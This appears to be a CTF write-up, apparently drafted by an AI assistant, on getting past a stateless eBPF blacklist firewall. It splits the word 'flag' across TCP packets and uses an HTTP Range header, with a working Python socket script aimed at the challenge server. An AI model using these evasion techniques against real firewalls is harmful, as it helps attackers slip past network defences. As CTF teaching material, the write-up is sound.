
# CTF Write-up: UofT Firewall Bypass

**Challenge Category:** Web/Networking

**Theme:** Bypassing Blacklist-based Firewalls via TCP Fragmentation and HTTP Byte Serving.

## 1. Challenge Overview

The objective was to retrieve the content of `flag.html` from a remote server. However, the server is protected by an eBPF-based firewall (`firewall.c`) that implements a strict **blacklist**.

### The Constraints

The firewall inspects every packet on both **Ingress** (incoming) and **Egress** (outgoing) traffic. It drops any packet containing:

1. The string: `"flag"`
2. The character: `%` (which prevents URL encoding bypasses like `%66%6c%61%67`)

## 2. The Vulnerability: Stateless Inspection

The firewall is **packet-based**. This means it only scans individual network packets. It does not reassemble the TCP stream to see the "full picture" like the web server does. We can exploit this "blind spot" by splitting our forbidden keywords across multiple packets.

## 3. The Exploit Strategy

### Part A: Ingress Bypass (TCP Splitting)

To request `/flag.html` without triggering the "flag" keyword filter, we split the HTTP request line.

* **Packet 1:** `GET /fl`
* **Packet 2:** `ag.html HTTP/1.1...`

By inserting a small delay (`time.sleep`) between these sends, we force the OS to transmit them separately. The firewall sees two harmless fragments, while the Nginx server reassembles them into a valid request.

### Part B: Egress Bypass (HTTP Range Header)

Even if we request the file successfully, the response contains the word "flag" in the HTML tags (e.g., `<title>flag</title>`), which triggers the Egress filter and blocks the data from reaching us.

To bypass this, we use the **HTTP Range Header**. This tells the server to only send a specific "slice" of the file. By targeting only the byte offset where the flag string exists, we skip the forbidden HTML tags entirely.

## 4. The Solution Script

We use a Python **Socket** to gain raw control over the TCP stream, which standard tools like Burp Suite or Browsers cannot easily do.

```python
import socket
import time

# Configuration
ip = "35.227.38.232"
port = 5000

# 1. Open a raw TCP socket (The "Pipe")
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
soc.connect((ip, port))

# 2. Send the first fragment of the forbidden word
soc.send(b"GET /fl")

# 3. Wait to force the network to send Packet #1 alone
time.sleep(0.1)

# 4. Send the rest of the request with the Range header
# We calculated byte 134 as the start of the flag inside flag.html
request = (
    b"ag.html HTTP/1.1\r\n"
    b"Host: 35.227.38.232:5000\r\n"
    b"Range: bytes=134-220\r\n\r\n" # \r\n\r\n signals end of request
)
soc.send(request)

# 5. Receive and display the bypassed response
response = soc.recv(4096)
print(response.decode())

soc.close()

```

## 5. Conclusion

This challenge demonstrates that **Blacklisting is not Security**.

* **Fragmentation** allows us to bypass Ingress filters by splitting forbidden strings.
* **Byte Serving (Range Headers)** allows us to bypass Egress filters by selectively exfiltrating data.

A better defense would be a **Whitelisting** approach or a **Stateful WAF** that reassembles TCP streams before inspection.

---

**Would you like me to show you how to format this as a PDF or a Markdown file for your GitHub repository?**
